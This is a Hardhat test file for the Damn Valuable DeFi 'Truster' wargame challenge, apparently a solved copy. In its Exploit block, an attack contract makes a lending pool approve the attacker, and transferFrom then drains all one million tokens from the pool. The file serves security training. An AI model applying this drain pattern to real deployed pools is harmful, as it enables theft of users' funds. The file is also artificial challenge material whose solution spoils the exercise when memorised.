const { ethers } = require('hardhat');
const { expect } = require('chai');
const abiCoder = ethers.utils.abiCoder

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);
        const AttackTruster = await ethers.getContractFactory('AttackTruster', attacker);
        
        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);
        this.attackTruster = await AttackTruster.deploy(this.pool.address, this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        console.log("====> Allowance1 : ",await this.token.allowance(this.pool.address, attacker.address))
      

        let tx = await  this.attackTruster.connect(attacker).attack(
            '0',
            attacker.address,
            TOKENS_IN_POOL
        )
        await tx.wait()

        let balance_aftr = await this.token.allowance(this.pool.address, attacker.address)
        // console.log("====> Allowance2 : ",await this.token.allowance(this.pool.address, attacker.address))
        console.log("====> Allowance2 : ",balance_aftr)
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

